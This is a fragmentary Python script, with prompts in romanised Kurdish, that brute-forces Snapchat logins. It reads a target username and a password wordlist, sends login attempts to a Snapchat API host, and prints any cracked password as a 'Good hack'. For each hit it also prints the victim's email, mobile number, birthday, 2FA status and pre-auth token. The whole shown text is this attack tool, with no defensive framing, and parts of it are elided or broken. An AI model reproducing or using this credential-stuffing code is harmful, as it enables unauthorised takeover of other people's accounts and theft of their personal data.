...
r = requests.session()
ra = input ( '''
RAQAM YAK DAQGRA BO BARDAWAMBWN :

''')
os.system("clear")

print("AGAR TOOLAKA WASTA YA3NY PASSWORDAKA RASTA")
time.sleep(2)


if ra == "1":
  user = input(f"{green}[?] {blue}Nawi snapaka: ")
  flo = input(f"{green}[?] {blue}fili wordlist: ")
  ...
  for password in password:
    ...
    "Host": "gcp.api.snapchat.com"
        ...
        if 'updates_response' in response:
            try:
                print("---------------------------------------")
                print(('username : ' + user + ' | password : ' + password + '[/]Paswordaka rasta'))
                print(" --> Email : "+str(info["updates_response"]["email"]))
                print(" --> mobile : "+str(info["updates_response"]["mobile"]))
                print(" --> birthday : "+str(info["updates_response"]["birthday"]))
        ...
        if 'two_fa_needed' in response:
            try:
                print("---------------------------------------")
                print(('username : ' + user + ' | password : ' + password + ' --> Good hack -> Oops 2FA '))
                print(" --> number 2FA : "+str(info["is_sms_two_fa_enabled"]))
                print(green_color +" --> token 2FA : "+str(info["pre_auth_token"]))
                print(+" --> number 2FA : "+str(info["phone_number"]))
                ...
                print("---------------------------------------")
                print(( '' + user + ':' + password + f' {red}[!] xalata'))
